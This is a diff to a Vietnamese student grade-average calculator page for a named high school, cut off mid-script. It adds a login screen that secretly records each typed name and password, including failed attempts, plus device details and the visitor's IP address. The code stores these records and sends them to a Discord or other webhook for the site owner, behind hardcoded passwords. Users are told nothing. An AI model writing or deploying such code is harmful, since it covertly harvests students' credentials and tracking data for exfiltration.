@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TÍNH ĐIỂM TRUNG BÌNH 2026-2027 - Khoa Nguyễn</title>
+    <title>HỆ THỐNG TÍNH ĐIỂM TRUNG BÌNH 2026-2027</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -38,6 +38,7 @@
             background-color: #f1f5f9;
             color: #0f172a;
             font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
         }
 
         input[type=number]::-webkit-inner-spin-button,
@@ -74,7 +75,7 @@
             background-color: transparent;
             border: 2px solid transparent;
             outline: none;
-            transition: background-color 0.1s, border-color 0.1s;
+            transition: background-color 0.15s, border-color 0.15s;
         }
 
         .cell-input:focus:not(:disabled) {
@@ -93,7 +94,6 @@
             cursor: not-allowed;
         }
 
-        /* Đóng khung chữ Tin học */
         .tinhoc-box {
             display: inline-block;
             border: 2px solid #0072bc;
@@ -115,20 +115,165 @@
             font-size: 18px;
             user-select: none;
             cursor: pointer;
-            transition: transform 0.06s ease, background-color 0.1s ease;
+            transition: transform 0.1s cubic-bezier(0.4, 0, 0.2, 1), background-color 0.15s ease;
         }
 
         .step-btn:active {
             transform: scale(0.92);
         }
+
+        /* Smooth UI Animations */
+        .smooth-fade {
+            transition: opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+
+        .shake-animation {
+            animation: shake 0.38s ease-in-out;
+        }
+
+        /* Background Hình Núi Phú Sĩ & Hoa Anh Đào */
+        .login-bg {
+            background-image: linear-gradient(rgba(15, 23, 42, 0.45), rgba(15, 23, 42, 0.65)), url('https://images.unsplash.com/photo-1578637387939-43c525550085?auto=format&fit=crop&w=2000&q=80');
+            background-size: cover;
+            background-position: center bottom;
+            background-repeat: no-repeat;
+        }
     </style>
 </head>
-<body class="py-4 px-3 sm:px-6 pb-20">
+<body class="min-h-screen relative">
 
     <!-- Toast Thông báo -->
-    <div id="toastBox" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none"></div>
+    <div id="toastBox" class="fixed bottom-4 right-4 z-[9999] flex flex-col gap-2 pointer-events-none"></div>
 
-    <!-- Modal Xác nhận xóa trắng -->
+    <!-- ========================================================================= -->
+    <!-- 1. MÀN HÌNH ĐĂNG NHẬP (KHÔNG CÓ TÊN TRƯỜNG, NỀN NÚI PHÚ SĨ, KHÔNG SHOW PASS) -->
+    <!-- ========================================================================= -->
+    <div id="loginScreen" class="fixed inset-0 z-50 flex items-center justify-center p-4 login-bg smooth-fade">
+        <div id="loginCard" class="w-full max-w-md bg-white/95 backdrop-blur-md rounded-2xl shadow-2xl border border-white/40 p-7 space-y-6 transition-all duration-300">
+            <div class="text-center space-y-1.5">
+                <div class="w-12 h-12 rounded-xl bg-slate-900 text-white flex items-center justify-center mx-auto text-xl shadow-md">
+                    🔐
+                </div>
+                <h2 class="text-xl font-extrabold text-slate-900 tracking-tight">ĐĂNG NHẬP HỆ THỐNG</h2>
+                <p class="text-xs text-slate-500 font-medium">Vui lòng nhập thông tin để tiếp tục sử dụng</p>
+            </div>
+
+            <form id="loginForm" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Tên:</label>
+                    <input 
+                        type="text" 
+                        id="loginNameInput" 
+                        required 
+                        placeholder="Nhập tên của bạn vào nha" 
+                        class="w-full px-3.5 py-2.5 text-sm rounded-xl border border-slate-300 bg-white/90 focus:border-nqd-blue focus:ring-2 focus:ring-sky-100 outline-none transition font-semibold text-slate-800"
+                    />
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">Mật khẩu:</label>
+                    <input 
+                        type="password" 
+                        id="loginPassInput" 
+                        required 
+                        placeholder="" 
+                        class="w-full px-3.5 py-2.5 text-sm rounded-xl border border-slate-300 bg-white/90 focus:border-nqd-blue focus:ring-2 focus:ring-sky-100 outline-none transition font-semibold text-slate-800"
+                    />
+                </div>
+
+                <div id="loginErrorMsg" class="hidden text-xs font-bold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 text-center"></div>
+
+                <button 
+                    type="submit" 
+                    id="btnLoginSubmit"
+                    class="w-full py-3 rounded-xl bg-nqd-blue hover:bg-nqd-dark active:scale-[0.98] text-white font-extrabold text-sm shadow-lg shadow-sky-600/20 transition duration-200"
+                >
+                    Đăng Nhập Ngay
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ========================================================================= -->
+    <!-- 2. POPUP NHẬP PASS XEM LỊCH SỬ (YÊU CẦU ĐÚNG: 0000) -->
+    <!-- ========================================================================= -->
+    <div id="historyAuthModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-slate-900/60 backdrop-blur-sm p-4 smooth-fade">
+        <div id="historyAuthCard" class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border border-slate-100 space-y-4">
+            <div class="flex items-center justify-between">
+                <h3 class="text-base font-extrabold text-slate-900 flex items-center gap-2">
+                    🛡️ Xác thực quản trị
+                </h3>
+                <button type="button" id="btnCancelAuthHistory" class="text-slate-400 hover:text-slate-600 text-lg leading-none font-bold">&times;</button>
+            </div>
+            <p class="text-xs text-slate-500 leading-relaxed">
+                Nhập mã bảo vệ để mở toàn bộ nhật ký đăng nhập và thông tin thiết bị đã lưu:
+            </p>
+            <div>
+                <input 
+                    type="password" 
+                    id="inputHistoryPass" 
+                    placeholder="Mật khẩu bảo vệ..." 
+                    class="w-full px-3.5 py-2.5 text-sm rounded-xl border border-slate-300 focus:border-nqd-blue focus:ring-2 focus:ring-sky-100 outline-none transition font-bold text-slate-800"
+                />
+            </div>
+            <div id="historyAuthError" class="hidden text-xs font-bold text-red-600">Mật khẩu không chính xác!</div>
+            <div class="flex items-center justify-end gap-2 pt-2">
+                <button type="button" id="btnCloseHistoryAuth" class="px-4 py-2 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold text-xs transition">
+                    Đóng
+                </button>
+                <button type="button" id="btnConfirmHistoryAuth" class="px-4 py-2 rounded-xl bg-nqd-blue hover:bg-nqd-dark text-white font-bold text-xs transition">
+                    Xác nhận
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================================= -->
+    <!-- 3. BẢNG HIỂN THỊ LỊCH SỬ NHẬP THÔNG TIN (KHÔNG CÓ NÚT XÓA) -->
+    <!-- ========================================================================= -->
+    <div id="historyViewModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-slate-900/70 backdrop-blur-sm p-3 sm:p-6 smooth-fade">
+        <div class="bg-white rounded-2xl max-w-4xl w-full h-[88vh] flex flex-col shadow-2xl border border-slate-200 overflow-hidden">
+            <div class="px-5 py-4 border-b border-slate-200 bg-slate-50 flex items-center justify-between">
+                <div>
+                    <h3 class="text-base font-extrabold text-slate-900 flex items-center gap-2">
+                        📜 Nhật Ký Đăng Nhập & Dữ Liệu Thiết Bị
+                    </h3>
+                    <p class="text-xs text-slate-500 mt-0.5">Lưu lại người dùng nhập tên gì, mật khẩu gì, thiết bị nào</p>
+                </div>
+                <button type="button" id="btnCloseHistoryView" class="px-3.5 py-1.5 rounded-lg bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold text-xs transition">
+                    Đóng lại
+                </button>
+            </div>
+
+            <!-- Khung cấu hình Webhook từ xa để xem qua mạng khi up GitHub -->
+            <div class="bg-sky-50/70 border-b border-sky-100 px-5 py-2.5 flex flex-wrap items-center justify-between gap-2 text-xs">
+                <span class="text-slate-600 font-medium">
+                    🌐 <b>Xem qua mạng khi up GitHub:</b> Dán URL Webhook (Discord / Google Sheet / Webhook.site) để nhận báo cáo tức thì:
+                </span>
+                <input 
+                    type="text" 
+                    id="webhookUrlInput" 
+                    placeholder="https://webhook.site/ hoặc https://discord.com/api/webhooks/..." 
+                    class="flex-1 min-w-[240px] px-2.5 py-1 text-xs border border-sky-200 rounded-lg outline-none bg-white font-mono text-slate-700"
+                />
+                <button type="button" id="btnSaveWebhook" class="px-2.5 py-1 bg-nqd-blue text-white rounded-lg font-bold text-[11px] shrink-0">
+                    Lưu Webhook
+                </button>
+            </div>
+
+            <div class="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-100/60" id="historyListContainer">
+                <!-- Nội dung lịch sử được render qua JavaScript -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Xác nhận xóa trắng điểm -->
     <div id="resetModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-slate-900/50 p-4">
         <div class="bg-white rounded-xl max-w-sm w-full p-5 shadow-xl border border-slate-200">
             <h3 class="text-base font-bold text-slate-900">Xóa trắng toàn bộ dữ liệu?</h3>
@@ -146,9 +291,12 @@
         </div>
     </div>
 
-    <div class="max-w-[1360px] mx-auto space-y-4">
+    <!-- ========================================================================= -->
+    <!-- 4. KHUNG GIAO DIỆN CHÍNH (HIỂN THỊ KHI ĐĂNG NHẬP THÀNH CÔNG) -->
+    <!-- ========================================================================= -->
+    <div id="mainAppWrapper" class="hidden opacity-0 py-4 px-3 sm:px-6 pb-20 max-w-[1360px] mx-auto space-y-4 smooth-fade">
 
-        <!-- 1. HEADER -->
+        <!-- HEADER -->
         <header class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm">
             <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
                 
@@ -159,36 +307,8 @@
                         <div class="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-white flex items-center justify-center overflow-hidden border border-slate-200">
                             <img id="customLogoImg" class="w-full h-full object-contain hidden" alt="Logo NQD">
                             <svg id="defaultLogoSvg" viewBox="0 0 300 300" class="w-full h-full">
-                                <defs>
-                                    <path id="textArcTop" d="M 38,150 A 112,112 0 1,1 262,150" />
-                                    <path id="textArcBottom" d="M 26,150 A 124,124 0 0,0 274,150" />
-                                </defs>
                                 <circle cx="150" cy="150" r="145" fill="#0072bc" stroke="#002e5d" stroke-width="4.5" />
                                 <circle cx="150" cy="150" r="95" fill="#ffffff" stroke="#002e5d" stroke-width="3.5" />
-                                <text fill="#ffffff" font-family="Inter, Arial, sans-serif" font-size="16.2" font-weight="800" letter-spacing="0.3">
-                                    <textPath href="#textArcTop" startOffset="50%" text-anchor="middle">
-                                        TRƯỜNG THPT CHUYÊN NGUYỄN QUANG DIÊU
-                                    </textPath>
-                                </text>
-                                <text fill="#ffffff" font-family="Inter, Arial, sans-serif" font-size="22" font-weight="800" letter-spacing="3.5">
-                                    <textPath href="#textArcBottom" startOffset="50%" text-anchor="middle">
-                                        ĐỒNG THÁP
-                                    </textPath>
-                                </text>
-                                <g transform="translate(27, 194) scale(0.72)">
-                                    <path d="M0,2 C-4,-10 -2,-20 0,-25 C2,-20 4,-10 0,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M-2,2 C-11,-6 -14,-16 -12,-21 C-7,-17 -4,-8 -2,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M2,2 C11,-6 14,-16 12,-21 C7,-17 4,-8 2,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M-4,3 C-15,0 -22,-8 -21,-13 C-14,-11 -8,-4 -4,3 Z" fill="#ffffff" stroke="#22c55e" stroke-width="1.2"/>
-                                    <path d="M4,3 C15,0 22,-8 21,-13 C14,-11 8,-4 4,3 Z" fill="#ffffff" stroke="#22c55e" stroke-width="1.2"/>
-                                </g>
-                                <g transform="translate(273, 194) scale(0.72)">
-                                    <path d="M0,2 C-4,-10 -2,-20 0,-25 C2,-20 4,-10 0,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M-2,2 C-11,-6 -14,-16 -12,-21 C-7,-17 -4,-8 -2,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M2,2 C11,-6 14,-16 12,-21 C7,-17 4,-8 2,2 Z" fill="#ffffff" stroke="#eab308" stroke-width="1.2"/>
-                                    <path d="M-4,3 C-15,0 -22,-8 -21,-13 C-14,-11 -8,-4 -4,3 Z" fill="#ffffff" stroke="#22c55e" stroke-width="1.2"/>
-                                    <path d="M4,3 C15,0 22,-8 21,-13 C14,-11 8,-4 4,3 Z" fill="#ffffff" stroke="#22c55e" stroke-width="1.2"/>
-                                </g>
                                 <path d="M148,204 C132,170 106,154 78,150 C92,165 108,182 148,204 Z" fill="#e65586"/>
                                 <path d="M148,204 C116,184 85,176 60,181 C65,190 70,197 74,203 C100,195 125,197 148,204 Z" fill="#c61662"/>
                                 <path d="M150,204 C156,162 172,138 193,128 C196,138 200,145 202,150 C178,162 162,182 150,204 Z" fill="#e65586"/>
@@ -197,13 +317,10 @@
                                 <path d="M148,198 C140,158 144,122 106,96 C128,95 148,105 159,120 C176,105 205,105 228,116 C198,115 174,122 162,144 C153,160 150,178 148,198 Z" fill="#0072bc"/>
                                 <circle cx="170" cy="94" r="11.5" fill="#0072bc"/>
                                 <polygon points="142,76 170,66 198,76 170,85" fill="#0072bc"/>
-                                <polyline points="194,77 197,94" fill="none" stroke="#0072bc" stroke-width="2.4"/>
-                                <circle cx="197" cy="96" r="3" fill="#0072bc"/>
                             </svg>
                         </div>
                     </div>
 
-                    <!-- Kế bên Logo đúng 2 dòng -->
                     <div class="border-r border-slate-200 pr-3.5 sm:pr-4">
                         <div class="text-xs sm:text-sm font-extrabold text-nqd-blue leading-snug tracking-wide">
                             TRƯỜNG THPT CHUYÊN<br>
@@ -211,30 +328,35 @@
                         </div>
                     </div>
 
-                    <!-- Tiêu đề -->
                     <div>
                         <h1 class="text-base sm:text-xl font-extrabold text-slate-900 tracking-tight">
                             TÍNH ĐIỂM TRUNG BÌNH 2026-2027
                         </h1>
-                        <span class="inline-block mt-1 bg-slate-900 text-white text-[11px] font-bold px-2.5 py-0.5 rounded">
+                        <span id="userBadgeDisplay" class="inline-block mt-1 bg-slate-900 text-white text-[11px] font-bold px-2.5 py-0.5 rounded">
                             của Khoa Nguyễn
                         </span>
                     </div>
                 </div>
 
-                <div class="flex items-center justify-end">
-                    <button type="button" id="btnOpenReset" class="px-3 py-2 rounded-lg bg-red-50 hover:bg-red-100 active:bg-red-200 text-red-600 font-semibold text-xs border border-red-200">
+                <div class="flex flex-wrap items-center justify-end gap-2">
+                    <button type="button" id="btnOpenHistoryAuth" class="px-3 py-2 rounded-lg bg-sky-50 hover:bg-sky-100 active:scale-95 text-nqd-blue font-bold text-xs border border-sky-200 transition">
+                        📜 Xem lịch sử nhập
+                    </button>
+
+                    <button type="button" id="btnOpenReset" class="px-3 py-2 rounded-lg bg-red-50 hover:bg-red-100 text-red-600 font-semibold text-xs border border-red-200 transition">
                         🗑️ Xóa trắng bảng điểm
+                    </button>
+
+                    <button type="button" id="btnLogout" class="px-3 py-2 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold text-xs transition">
+                        🚪 Đăng xuất
                     </button>
                 </div>
 
             </div>
         </header>
 
-        <!-- 2. BẢNG TỔNG HỢP: ĐTB TỔNG | HỌC LỰC | HỌC BỔNG -->
+        <!-- BẢNG TỔNG HỢP: ĐTB TỔNG | HỌC LỰC | HỌC BỔNG -->
         <section class="grid grid-cols-1 md:grid-cols-3 gap-3.5">
-            
-            <!-- ĐTB Tổng -->
             <div class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between">
@@ -252,7 +374,6 @@
                 </div>
             </div>
 
-            <!-- Học lực -->
             <div class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between">
@@ -282,7 +403,6 @@
                 </div>
             </div>
 
-            <!-- Học bổng -->
             <div class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between">
@@ -314,21 +434,18 @@
                     </p>
                 </div>
             </div>
-
         </section>
 
-        <!-- CẢNH BÁO QUÁ 45 BUỔI NGHỈ (TỪ BUỔI 46 TRỞ ĐI) -->
+        <!-- CẢNH BÁO NGHỈ > 45 BUỔI -->
         <div id="over45Banner" class="hidden bg-red-600 text-white rounded-xl p-3.5 shadow-sm items-center justify-between gap-3">
             <div class="text-xs sm:text-sm font-extrabold">
                 🚨 KHÔNG ĐỦ ĐIỀU KIỆN LÊN LỚP! (Tổng số buổi nghỉ Có phép + Không phép đã tới <span id="over45CountText">46</span>/45 buổi)
             </div>
         </div>
 
-        <!-- 3. ĐIỂM HOẠT ĐỘNG GỌN TRỰC QUAN -->
+        <!-- ĐIỂM HOẠT ĐỘNG -->
         <section class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm">
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-4 items-center">
-                
-                <!-- Trái: Điểm hoạt động -->
                 <div id="activityCard" class="lg:col-span-5 bg-slate-50 rounded-xl border border-slate-200 p-4 cursor-pointer select-none">
                     <div class="flex items-center justify-between">
                         <span class="text-xs font-bold uppercase text-slate-600">Điểm Hoạt Động (Gốc 1000)</span>
@@ -345,7 +462,6 @@
                         </span>
                     </div>
 
-                    <!-- Thanh màu -->
                     <div class="w-full h-3.5 bg-slate-200 rounded-full overflow-hidden mt-3">
                         <div id="activityProgressBar" class="h-full transition-all duration-300" style="width: 100%; background-color: #10b981;"></div>
                     </div>
@@ -355,10 +471,7 @@
                     </div>
                 </div>
 
-                <!-- Phải: 3 mục Đi trễ (-10), Có phép (-10), Không phép (-25) -->
                 <div class="lg:col-span-7 grid grid-cols-1 sm:grid-cols-3 gap-3">
-                    
-                    <!-- 1. Đi trễ (-10) -->
                     <div class="bg-slate-50 rounded-xl border border-slate-200 p-3 flex sm:flex-col items-center sm:items-stretch justify-between gap-2">
                         <div class="flex items-center justify-between">
                             <div>
@@ -374,7 +487,6 @@
                         </div>
                     </div>
 
-                    <!-- 2. Có phép (-10) -->
                     <div class="bg-slate-50 rounded-xl border border-slate-200 p-3 flex sm:flex-col items-center sm:items-stretch justify-between gap-2">
                         <div class="flex items-center justify-between">
                             <div>
@@ -390,7 +502,6 @@
                         </div>
                     </div>
 
-                    <!-- 3. Không phép (-25) -->
                     <div class="bg-slate-50 rounded-xl border border-slate-200 p-3 flex sm:flex-col items-center sm:items-stretch justify-between gap-2">
                         <div class="flex items-center justify-between">
                             <div>
@@ -405,15 +516,13 @@
                             <button type="button" data-action="step" data-field="unexcused" data-delta="1" class="step-btn bg-nqd-blue text-white">+</button>
                         </div>
                     </div>
-
                 </div>
             </div>
         </section>
 
-        <!-- 4. NHẬN DIỆN ĐIỂM THÔNG QUA ẢNH CHỤP MÀN HÌNH TỪ APP VIETSCHOOL (TỐI ĐA 3 ẢNH) -->
+        <!-- OCR VIETSCHOOL -->
         <section class="bg-white rounded-xl border border-slate-200 p-3.5 shadow-sm">
             <input type="file" id="ocrImageInput" accept="image/*" multiple class="hidden">
-            
             <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                 <div class="text-xs text-slate-600">
                     <b class="text-slate-800 uppercase">Nhận diện điểm thông qua ảnh chụp màn hình từ app Vietschool:</b>
@@ -456,7 +565,7 @@
             </div>
         </section>
 
-        <!-- 5. BẢNG NHẬP ĐIỂM THỦ CÔNG 9 MÔN (ĐÃ HIỂN THỊ TĨNH HOÀN TOÀN) -->
+        <!-- BẢNG NHẬP ĐIỂM -->
         <section class="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden">
             <div class="px-4 py-2.5 bg-slate-800 text-white flex flex-wrap items-center justify-between gap-2">
                 <span class="font-bold text-xs sm:text-sm uppercase">✍️ Bảng Nhập Điểm 9 Môn (15p: HS1 • GK: HS2 • CK: HS3)</span>
@@ -471,14 +580,12 @@
             </div>
         </section>
 
-        <!-- 6. BIỂU ĐỒ ĐƯỜNG 9 MÔN TỪ CAO -> THẤP (CÓ CHẤM MIN, MAX VÀ TRUNG BÌNH) -->
+        <!-- BIỂU ĐỒ ĐƯỜNG -->
         <section class="bg-white rounded-xl border border-slate-200 p-4 shadow-sm">
             <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 mb-3">
-                <div>
-                    <h2 class="text-xs sm:text-sm font-bold uppercase text-slate-800">
-                        Biểu Đồ ĐTB 9 Môn (Sắp xếp từ Cao → Thấp)
-                    </h2>
-                </div>
+                <h2 class="text-xs sm:text-sm font-bold uppercase text-slate-800">
+                    Biểu Đồ ĐTB 9 Môn (Sắp xếp từ Cao → Thấp)
+                </h2>
                 <div class="flex flex-wrap items-center gap-3.5 text-xs font-semibold">
                     <span class="inline-flex items-center gap-1.5 text-nqd-blue">
                         <span class="w-2.5 h-2.5 rounded-full bg-nqd-blue inline-block"></span> ĐTB
@@ -506,7 +613,11 @@
 
     </div>
 
+    <!-- SCRIPT XỬ LÝ TOÀN BỘ LOGIC -->
     <script>
+        const AUTH_SYSTEM_PASS = "9999";    // Mật khẩu vào app
+        const HISTORY_VIEW_PASS = "0000";   // Mật khẩu xem lịch sử
+        
         const SUBJECTS = [
             { id: 'toan', name: 'Toán', isFramed: false },
             { id: 'van',  name: 'Văn', isFramed: false },
@@ -522,8 +633,12 @@
         const MIN_15P_COLS = 2;
         const MAX_15P_LIMIT = 5;
         const MAX_TOTAL_ABSENT = 45;
+        
         const STORAGE_KEY = 'KHOA_NGUYEN_DATA_V9_FINAL';
         const LOGO_KEY = 'KHOA_NGUYEN_LOGO_V9';
+        const AUTH_USER_KEY = 'NQD_AUTH_CURRENT_USER';
+        const HISTORY_LOG_KEY = 'NQD_LOGIN_DEVICE_HISTORY_LOGS';
+        const WEBHOOK_KEY = 'NQD_REMOTE_WEBHOOK_URL';
 
         let appState = getDefaultState();
         let detectedUnnamedSubjectData = null;
@@ -541,14 +656,275 @@
             });
             return {
                 grades,
-                violations: {
-                    late: 0,
-                    excused: 0,
-                    unexcused: 0
-                }
+                violations: { late: 0, excused: 0, unexcused: 0 }
             };
         }
 
+        // =========================================================================
+        // THU THẬP THÔNG TIN THIẾT BỊ VÀ GHI NHẬN LỊCH SỬ
+        // =========================================================================
+        function getDeviceDiagnostics() {
+            const ua = navigator.userAgent;
+            let os = "Không xác định";
+            if (/android/i.test(ua)) os = "Android";
+            else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS (iPhone/iPad)";
+            else if (/Windows NT 10.0/i.test(ua)) os = "Windows 10/11";
+            else if (/Windows/i.test(ua)) os = "Windows";
+            else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
+            else if (/Linux/i.test(ua)) os = "Linux";
+
+            let browser = "Không xác định";
+            if (/Edg/i.test(ua)) browser = "Microsoft Edge";
+            else if (/Chrome/i.test(ua)) browser = "Google Chrome";
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Apple Safari";
+            else if (/Firefox/i.test(ua)) browser = "Mozilla Firefox";
+
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timeStr = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+
+            return { os, browser, screenRes, timeStr, userAgent: ua };
+        }
+
+        async function recordLoginAudit(nameEntered, passEntered, isSuccess) {
+            const device = getDeviceDiagnostics();
+            let networkIp = "Đang kiểm tra...";
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+                if (ipRes.ok) {
+                    const ipData = await ipRes.json();
+                    networkIp = ipData.ip || "Không rõ";
+                }
+            } catch (e) {
+                networkIp = "Không thể lấy IP (Chặn CORS hoặc ngoại tuyến)";
+            }
+
+            const record = {
+                id: 'log_' + Date.now(),
+                timestamp: device.timeStr,
+                name: nameEntered || '(Trống)',
+                passwordEntered: passEntered || '(Trống)',
+                status: isSuccess ? 'Thành công' : 'Thất bại (Sai pass)',
+                os: device.os,
+                browser: device.browser,
+                screen: device.screenRes,
+                ip: networkIp,
+                rawUA: device.userAgent
+            };
+
+            // Lưu cục bộ (LocalStorage)
+            try {
+                const rawLogs = localStorage.getItem(HISTORY_LOG_KEY);
+                const logs = rawLogs ? JSON.parse(rawLogs) : [];
+                logs.unshift(record); // Cho bản mới nhất lên đầu
+                localStorage.setItem(HISTORY_LOG_KEY, JSON.stringify(logs));
+            } catch (err) {}
+
+            // Gửi dữ liệu ra Webhook đám mây (nếu đã cấu hình) để chủ web xem được từ xa
+            dispatchRemoteWebhook(record);
+        }
+
+        function dispatchRemoteWebhook(record) {
+            const webhookUrl = localStorage.getItem(WEBHOOK_KEY);
+            if (!webhookUrl || !webhookUrl.startsWith('http')) return;
+
+            // Tự động nhận diện Discord Webhook hoặc HTTP Webhook thông thường
+            let payload = {};
+            if (webhookUrl.includes('discord.com/api/webhooks')) {
+                payload = {
+                    content: `🔔 **PHÁT HIỆN LƯỢT ĐĂNG NHẬP MỚI VÀO WEB:**\n👤 **Tên nhập:** \`${record.name}\`\n🔑 **Mật khẩu đã gõ:** \`${record.passwordEntered}\`\n📌 **Kết quả:** **${record.status}**\n📱 **Thiết bị:** ${record.os} | ${record.browser} (${record.screen})\n🌐 **IP mạng:** \`${record.ip}\`\n⏰ **Thời gian:** ${record.timestamp}`
+                };
+            } else {
+                payload = record;
+            }
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // =========================================================================
+        // ĐIỀU HƯỚNG ĐĂNG NHẬP & PHÂN QUYỀN
+        // =========================================================================
+        const loginScreen = document.getElementById('loginScreen');
+        const mainAppWrapper = document.getElementById('mainAppWrapper');
+        const loginForm = document.getElementById('loginForm');
+        const loginErrorMsg = document.getElementById('loginErrorMsg');
+        const loginCard = document.getElementById('loginCard');
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const nameVal = document.getElementById('loginNameInput').value.trim();
+            const passVal = document.getElementById('loginPassInput').value;
+
+            if (passVal === AUTH_SYSTEM_PASS) {
+                // Đăng nhập đúng: Ghi nhận log thành công
+                recordLoginAudit(nameVal, passVal, true);
+                sessionStorage.setItem(AUTH_USER_KEY, nameVal);
+                document.getElementById('userBadgeDisplay').textContent = `của ${nameVal}`;
+
+                loginScreen.classList.add('opacity-0', 'pointer-events-none');
+                setTimeout(() => {
+                    loginScreen.classList.add('hidden');
+                    mainAppWrapper.classList.remove('hidden');
+                    setTimeout(() => {
+                        mainAppWrapper.classList.remove('opacity-0');
+                    }, 50);
+                }, 400);
+
+                showToast(`Chào mừng ${nameVal} đã truy cập!`);
+            } else {
+                // Đăng nhập sai: Ghi nhận pass họ đã gõ vào log
+                recordLoginAudit(nameVal, passVal, false);
+
+                loginCard.classList.remove('shake-animation');
+                void loginCard.offsetWidth; // Trigger reflow
+                loginCard.classList.add('shake-animation');
+
+                loginErrorMsg.textContent = "Mật khẩu không chính xác! Vui lòng thử lại.";
+                loginErrorMsg.classList.remove('hidden');
+            }
+        });
+
+        document.getElementById('btnLogout').addEventListener('click', () => {
+            sessionStorage.removeItem(AUTH_USER_KEY);
+            window.location.reload();
+        });
+
+        // =========================================================================
+        // POPUP XÁC THỰC XEM LỊCH SỬ (MẬT KHẨU: 0000 - KHÔNG CÓ NÚT XÓA)
+        // =========================================================================
+        const historyAuthModal = document.getElementById('historyAuthModal');
+        const historyViewModal = document.getElementById('historyViewModal');
+        const inputHistoryPass = document.getElementById('inputHistoryPass');
+        const historyAuthError = document.getElementById('historyAuthError');
+        const historyAuthCard = document.getElementById('historyAuthCard');
+
+        document.getElementById('btnOpenHistoryAuth').addEventListener('click', () => {
+            inputHistoryPass.value = '';
+            historyAuthError.classList.add('hidden');
+            historyAuthModal.classList.remove('hidden');
+            historyAuthModal.classList.add('flex');
+            setTimeout(() => inputHistoryPass.focus(), 150);
+        });
+
+        function closeHistoryAuth() {
+            historyAuthModal.classList.add('hidden');
+            historyAuthModal.classList.remove('flex');
+        }
+
+        document.getElementById('btnCloseHistoryAuth').addEventListener('click', closeHistoryAuth);
+        document.getElementById('btnCancelAuthHistory').addEventListener('click', closeHistoryAuth);
+
+        document.getElementById('btnConfirmHistoryAuth').addEventListener('click', verifyHistoryPass);
+        inputHistoryPass.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') verifyHistoryPass();
+        });
+
+        function verifyHistoryPass() {
+            const entered = inputHistoryPass.value;
+            if (entered === HISTORY_VIEW_PASS) {
+                closeHistoryAuth();
+                openHistoryViewModal();
+            } else {
+                historyAuthCard.classList.remove('shake-animation');
+                void historyAuthCard.offsetWidth;
+                historyAuthCard.classList.add('shake-animation');
+                historyAuthError.classList.remove('hidden');
+            }
+        }
+
+        function openHistoryViewModal() {
+            renderHistoryLogs();
+            historyViewModal.classList.remove('hidden');
+            historyViewModal.classList.add('flex');
+
+            const savedWebhook = localStorage.getItem(WEBHOOK_KEY) || '';
+            document.getElementById('webhookUrlInput').value = savedWebhook;
+        }
+
+        document.getElementById('btnCloseHistoryView').addEventListener('click', () => {
+            historyViewModal.classList.add('hidden');
+            historyViewModal.classList.remove('flex');
+        });
+
+        document.getElementById('btnSaveWebhook').addEventListener('click', () => {
+            const url = document.getElementById('webhookUrlInput').value.trim();
+            localStorage.setItem(WEBHOOK_KEY, url);
+            showToast('Đã lưu cấu hình Webhook từ xa!');
+        });
+
+        function renderHistoryLogs() {
